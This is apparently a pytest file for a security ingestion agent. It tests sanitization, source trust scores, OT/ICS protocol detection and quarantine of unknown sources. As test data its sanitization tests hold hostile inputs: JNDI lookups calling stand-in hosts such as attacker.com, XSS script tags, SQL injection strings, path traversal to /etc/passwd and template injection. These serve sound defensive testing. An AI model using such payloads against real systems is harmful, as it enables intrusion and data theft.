"""
tests/test_a1_ingest.py
Comprehensive unit tests for A1: Ingestion & Trust Agent.

Covers:
  - SD-0 Sanitization (JNDI, XSS, SQL, hidden Unicode, path traversal, templates)
  - Source trust scoring (all tiers + robust normalization)
  - OT protocol detection (Modbus, DNP3, S7, OPC-UA, IEC-61850)
  - Quarantine behavior (unknown source, file write, quarantine_id, A2 bypass)
  - E2E pipeline output validation (Pydantic model compliance)
  - A2 integration test (Gap #9)

Run:  pytest tests/test_a1_ingest.py -v
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
import uuid
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest

# Ensure the hci_os root is importable
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import agents.a1_ingest as a1  # full module for monkey-patching paths
from agents.a1_ingest import (
    OTContext,
    IngestOutput,
    QuarantineRecord,
    detect_ot_protocol,
    get_quarantine_count,
    get_trust_score,
    process,
    sanitize,
)


# ─── Fixtures ────────────────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def _tmp_quarantine(tmp_path, monkeypatch):
    """Redirect quarantine file to a temp dir for every test."""
    qfile = tmp_path / "quarantine.jsonl"
    monkeypatch.setattr(a1, "_QUARANTINE_FILE", qfile)
    monkeypatch.setattr(a1, "_DATA_DIR", tmp_path)
    yield qfile


# ─── TestSanitization ────────────────────────────────────────────────────────

class TestSanitization:
    """SD-0: All injection patterns are stripped from string fields."""

    def test_jndi_injection_stripped(self):
        data = {"msg": "${jndi:ldap://attacker.com/exploit} hello"}
        cleaned, events = sanitize(data)
        assert "${jndi:" not in cleaned["msg"]
        assert "[SANITIZED:JNDI]" in cleaned["msg"]
        assert any("JNDI_INJECTION" in e for e in events)

    def test_script_tag_stripped(self):
        data = {"field": "<script>alert('xss')</script> world"}
        cleaned, events = sanitize(data)
        assert "<script>" not in cleaned["field"]
        assert "[SANITIZED:XSS]" in cleaned["field"]

    def test_sql_or_tautology_stripped(self):
        data = {"user": "admin' OR '1'='1"}
        cleaned, events = sanitize(data)
        assert "[SANITIZED:SQLi]" in cleaned["user"]

    def test_sql_drop_table_stripped(self):
        data = {"query": "anything; DROP TABLE users"}
        cleaned, events = sanitize(data)
        assert "[SANITIZED:SQLi]" in cleaned["query"]

    def test_sql_union_select_stripped(self):
        data = {"q": "foo UNION SELECT * FROM secrets"}
        cleaned, events = sanitize(data)
        assert "[SANITIZED:SQLi]" in cleaned["q"]

    def test_path_traversal_raw_stripped(self):
        data = {"path": "/cgi-bin/../../etc/passwd"}
        cleaned, events = sanitize(data)
        assert "../" not in cleaned["path"]
        assert "[SANITIZED:PATH_TRAVERSAL]" in cleaned["path"]

    def test_path_traversal_encoded_stripped(self):
        data = {"url": "/api/%2e%2e/admin"}
        cleaned, events = sanitize(data)
        assert "%2e%2e" not in cleaned["url"].lower()

    def test_hidden_unicode_stripped(self):
        # zero-width space U+200B embedded in "admin"
        data = {"username": "adm\u200bin"}
        cleaned, events = sanitize(data)
        assert "\u200b" not in cleaned["username"]

    def test_template_injection_stripped(self):
        data = {"comment": "Hello {{7*7}} world {%include /etc/passwd%}"}
        cleaned, events = sanitize(data)
        assert "{{" not in cleaned["comment"]

    def test_clean_string_unchanged(self):
        data = {"ip": "185.23.147.82", "method": "GET", "bytes": 1024}
        cleaned, events = sanitize(data)
        assert cleaned["ip"] == "185.23.147.82"
        assert cleaned["method"] == "GET"
        assert cleaned["bytes"] == 1024
        assert events == []

    def test_numeric_fields_untouched(self):
        data = {"port": 443, "score": 0.95, "flag": True, "nil": None}
        cleaned, events = sanitize(data)
        assert cleaned["port"] == 443
        assert cleaned["score"] == 0.95
        assert cleaned["flag"] is True
        assert cleaned["nil"] is None

    def test_nested_dict_sanitized(self):
        """Gap #5 — nested dicts must be recursively cleaned."""
        data = {
            "outer": {
                "inner": "${jndi:ldap://evil.com}",
                "safe": "hello",
            }
        }
        cleaned, events = sanitize(data)
        assert "[SANITIZED:JNDI]" in cleaned["outer"]["inner"]
        assert cleaned["outer"]["safe"] == "hello"

    def test_nested_list_sanitized(self):
        """Gap #5 — lists of strings must be cleaned."""
        data = {"cmds": ["normal_command", "<script>evil()</script>"]}
        cleaned, events = sanitize(data)
        assert "<script>" not in cleaned["cmds"][1]

    def test_deeply_nested_structure(self):
        """Gap #5 — three levels deep."""
        data = {"a": {"b": {"c": "${jndi:ldap://x.com}"}}}
        cleaned, events = sanitize(data)
        assert "[SANITIZED:JNDI]" in cleaned["a"]["b"]["c"]

    def test_sanitization_events_logged(self):
        """Gap #1 — events list must be non-empty when something is stripped."""
        data = {"x": "${jndi:ldap://attacker.com}"}
        _, events = sanitize(data, evidence_id="TEST-01")
        assert len(events) > 0
        assert "TEST-01" in events[0]

    def test_multiple_injections_in_one_field(self):
        data = {"payload": "${jndi:ldap://a.com} <script>x</script>"}
        cleaned, events = sanitize(data)
        assert "${jndi:" not in cleaned["payload"]
        assert "<script>" not in cleaned["payload"]
        assert len(events) >= 2


# ─── TestTrustScoring ────────────────────────────────────────────────────────

class TestTrustScoring:
    """Source trust table — all tiers + normalization variants (Gap #7)."""

    def test_cert_in_exact(self):
        assert get_trust_score("CERT-In") == pytest.approx(0.95, abs=0.001)

    def test_cert_in_variants(self):
        for label in ("cert-in", "certin", "CERT_In", "CERTIn", "Cert In"):
            assert get_trust_score(label) == pytest.approx(0.95, abs=0.001), f"Failed for {label!r}"

    def test_mitre(self):
        assert get_trust_score("MITRE") == pytest.approx(0.90, abs=0.001)

    def test_mitre_lowercase(self):
        assert get_trust_score("mitre") == pytest.approx(0.90, abs=0.001)

    def test_nvd(self):
        assert get_trust_score("NVD") == pytest.approx(0.85, abs=0.001)

    def test_crowdstrike(self):
        assert get_trust_score("CrowdStrike") == pytest.approx(0.75, abs=0.001)

    def test_mandiant(self):
        assert get_trust_score("Mandiant") == pytest.approx(0.75, abs=0.001)

    def test_vendor_generic(self):
        assert get_trust_score("vendor") == pytest.approx(0.75, abs=0.001)

    def test_vendor_with_prefix(self):
        # "vendor-crowdstrike" should match via substring
        score = get_trust_score("vendor-crowdstrike")
        assert score >= 0.75

    def test_internal(self):
        assert get_trust_score("internal") == pytest.approx(0.70, abs=0.001)

    def test_internal_uppercase(self):
        assert get_trust_score("INTERNAL") == pytest.approx(0.70, abs=0.001)

    def test_partner(self):
        assert get_trust_score("partner") == pytest.approx(0.50, abs=0.001)

    def test_unknown_returns_zero(self):
        assert get_trust_score("dark_web_feed") == pytest.approx(0.00, abs=0.001)

    def test_empty_string_returns_zero(self):
        assert get_trust_score("") == pytest.approx(0.00, abs=0.001)

    def test_random_garbage_returns_zero(self):
        assert get_trust_score("abc123xyz") == pytest.approx(0.00, abs=0.001)


# ─── TestOTProtocolDetection ──────────────────────────────────────────────────

class TestOTProtocolDetection:
    """OT/ICS protocol signature scanning — first match (Gap #4)."""

    def test_modbus_from_protocol_field(self):
        assert detect_ot_protocol({"protocol": "modbus"}) == "Modbus"

    def test_modbus_mbap(self):
        assert detect_ot_protocol({"header": "MBAP frame"}) == "Modbus"

    def test_dnp3(self):
        assert detect_ot_protocol({"protocol": "dnp3"}) == "DNP3"

    def test_s7comm(self):
        assert detect_ot_protocol({"proto": "s7comm"}) == "S7"

    def test_opc_ua_port(self):
        assert detect_ot_protocol({"dst_port": "4840", "protocol": "opc-ua"}) == "OPC-UA"

    def test_iec61850_goose(self):
        assert detect_ot_protocol({"message": "GOOSE frame detected"}) == "IEC-61850"

    def test_no_ot_protocol_returns_none(self):
        assert detect_ot_protocol({"protocol": "HTTP", "method": "GET"}) is None

    def test_first_match_wins(self):
        """Gap #4 — if multiple signatures hit, first in _OT_SIGNATURES wins."""
        # Both Modbus and DNP3 present — Modbus is first in the ordered list
        data = {"protocol": "modbus dnp3"}
        result = detect_ot_protocol(data)
        assert result == "Modbus"

    def test_case_insensitive_detection(self):
        assert detect_ot_protocol({"msg": "Modbus TCP frame"}) == "Modbus"
        assert detect_ot_protocol({"msg": "S7COMM connection"}) == "S7"

    def test_scada_field_values_scanned(self):
        """Both keys and values are scanned."""
        assert detect_ot_protocol({"function_code": "0x03"}) == "Modbus"


# ─── TestQuarantine ───────────────────────────────────────────────────────────

class TestQuarantine:
    """Unknown sources are quarantined — not forwarded to A2."""

    def test_unknown_source_quarantined(self, _tmp_quarantine):
        result = process({"source": "dark_web", "msg": "alert"})
        assert result["status"] == "quarantined"
        assert result["source"] == "dark_web"
        assert _tmp_quarantine.exists()

    def test_quarantine_file_written(self, _tmp_quarantine):
        process({"source": "unknown_feed", "msg": "test"})
        assert _tmp_quarantine.exists()
        lines = _tmp_quarantine.read_text().splitlines()
        assert len(lines) == 1
        record = json.loads(lines[0])
        assert record["status"] == "quarantined"

    def test_quarantine_id_is_uuid(self, _tmp_quarantine):
        """Gap #8 — quarantine_id must be a valid UUID."""
        result = process({"source": "unknown", "msg": "test"})
        assert "quarantine_id" in result
        # Should not raise
        uuid.UUID(result["quarantine_id"])

    def test_quarantine_contains_raw_data(self, _tmp_quarantine):
        """Gap #8 — quarantine record embeds raw_data snapshot."""
        process({"source": "unknown", "msg": "attack payload", "ip": "1.2.3.4"})
        lines = _tmp_quarantine.read_text().splitlines()
        record = json.loads(lines[0])
        assert "raw_data" in record
        assert record["raw_data"].get("ip") == "1.2.3.4"

    def test_quarantine_not_forwarded_to_a2(self, _tmp_quarantine):
        """Quarantined events must NOT produce IngestOutput fields."""
        result = process({"source": "evil_feed"})
        assert "sanitized_raw" not in result
        assert "trust_score" not in result

    def test_multiple_quarantine_events_appended(self, _tmp_quarantine):
        process({"source": "unk1", "msg": "a"})
        process({"source": "unk2", "msg": "b"})
        count = get_quarantine_count()
        assert count == 2

    def test_quarantine_rotation(self, _tmp_quarantine, monkeypatch):
        """Gap #3 — rotation triggers when file exceeds 10 MB."""
        # Pre-fill the quarantine file to just over the limit
        _tmp_quarantine.write_bytes(b"x" * (a1._QUARANTINE_MAX_BYTES + 1))
        monkeypatch.setattr(a1, "_QUARANTINE_MAX_BYTES", 10)  # lower threshold

        # Trigger a quarantine write — should rotate
        process({"source": "unk_rot", "msg": "rotation test"})

        # The original file is gone (renamed), a new one exists
        jsonl_files = list(_tmp_quarantine.parent.glob("quarantine*.jsonl"))
        assert len(jsonl_files) >= 1

    def test_no_source_key_defaults_to_unknown(self, _tmp_quarantine):
        """Gap #2 — missing 'source' key → 'unknown' → quarantined."""
        result = process({"message": "no source here"})
        assert result["status"] == "quarantined"
        assert result["source"] == "unknown"


# ─── TestProcess ─────────────────────────────────────────────────────────────

class TestProcess:
    """E2E tests for process() — covers IngestOutput schema and routing."""

    def test_cert_in_output_has_required_fields(self):
        result = process({"source": "CERT-In", "msg": "advisory"})
        assert result["trust_score"] == pytest.approx(0.95, abs=0.001)
        assert result["source"] == "CERT-In"
        assert "sanitized_raw" in result
        assert "ot_context" in result
        assert result["quarantined"] is False

    def test_internal_source_trust_score(self):
        result = process({"source": "internal", "msg": "syslog"})
        assert result["trust_score"] == pytest.approx(0.70, abs=0.001)

    def test_partner_source_trust_score(self):
        result = process({"source": "partner", "msg": "feed"})
        assert result["trust_score"] == pytest.approx(0.50, abs=0.001)

    def test_ot_protocol_in_output(self):
        result = process({
            "source": "internal",
            "protocol": "modbus",
            "function_code": "0x01",
        })
        assert result["ot_context"]["protocol"] == "Modbus"

    def test_it_event_ot_protocol_none(self):
        result = process({
            "source": "internal",
            "protocol": "HTTP",
            "method": "GET",
        })
        assert result["ot_context"]["protocol"] is None

    def test_jndi_stripped_before_a2(self):
        """Injection payload must be gone in sanitized_raw."""
        result = process({
            "source": "CERT-In",
            "message": "${jndi:ldap://evil.com/x}",
        })
        assert "${jndi:" not in result["sanitized_raw"].get("message", "")
        assert "[SANITIZED:JNDI]" in result["sanitized_raw"]["message"]

    def test_sanitization_events_in_output(self):
        result = process({
            "source": "CERT-In",
            "message": "${jndi:ldap://evil.com/x}",
        })
        assert len(result["sanitization_events"]) > 0

    def test_clean_event_no_sanitization_events(self):
        result = process({"source": "internal", "ip": "10.0.0.1"})
        assert result["sanitization_events"] == []

    def test_non_dict_input_handled(self, _tmp_quarantine):
        """Non-dict input should not crash."""
        result = process(None)  # type: ignore
        # Should be quarantined (source defaults to unknown)
        assert result["status"] == "quarantined"

    def test_source_key_variants_extracted(self):
        """Gap #2 — 'Source' (capital S) key also works."""
        result = process({"Source": "CERT-In", "msg": "test"})
        assert result["trust_score"] == pytest.approx(0.95, abs=0.001)

    def test_pydantic_validation_trust_score_bounds(self):
        """Gap #6 — trust_score must remain in [0.0, 1.0]."""
        result = process({"source": "CERT-In"})
        score = result["trust_score"]
        assert 0.0 <= score <= 1.0

    def test_output_is_dict(self):
        result = process({"source": "MITRE", "technique": "T1059"})
        assert isinstance(result, dict)


# ─── TestA2Integration ───────────────────────────────────────────────────────

class TestA2Integration:
    """
    Gap #9 — Verify that A1 output can be fed into A2 process() without errors.
    This catches pipeline breakage early.
    """

    def test_a1_output_feeds_a2(self):
        """A1 sanitized_raw must be a valid input for A2.process()."""
        from agents.a2_normalize import process as a2_process

        a1_result = process({
            "source": "CERT-In",
            "src_ip": "185.23.147.82",
            "dst_ip": "203.94.1.10",
            "request_path": "/api/login",
            "http_method": "POST",
            "status_code": 200,
            "bytes_sent": 512,
            "timestamp": "2026-03-15T02:47:33Z",
        })

        assert a1_result.get("quarantined") is False

        # Feed the sanitized_raw into A2
        sanitized_raw = a1_result["sanitized_raw"]
        ev = a2_process(sanitized_raw, asset_id="CBSE-WebSvr-01", source="web_access_log")

        from objects.evidence import Evidence
        assert isinstance(ev, Evidence)
        assert ev.source == "web_access_log"
        assert ev.asset_id == "CBSE-WebSvr-01"

    def test_a1_ot_context_propagates_to_a2(self):
        """OT protocol detected by A1 should be preserved and consistent with A2 output."""
        from agents.a2_normalize import process as a2_process

        a1_result = process({
            "source": "internal",
            "src_ip": "10.0.1.99",
            "dst_ip": "10.0.2.10",
            "function": "write_coil",
            "protocol": "modbus",
            "timestamp": "2026-01-26T23:00:00Z",
        })

        assert a1_result["ot_context"]["protocol"] == "Modbus"

        # A2 also independently detects Modbus — ensure consistency
        ev = a2_process(
            a1_result["sanitized_raw"],
            asset_id="CBSE-OT-SCADA-01",
            source="scada",
        )
        assert ev.context["ot_context"]["protocol"] == "Modbus"

    def test_quarantined_event_never_reaches_a2(self, _tmp_quarantine):
        """Unknown source: A2 must never be called."""
        from agents.a2_normalize import process as a2_process

        result = process({"source": "malicious_feed", "msg": "exploit"})
        assert result["status"] == "quarantined"
        # Result dict has no 'sanitized_raw' — A2 cannot be fed
        assert "sanitized_raw" not in result


# ─── Run ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
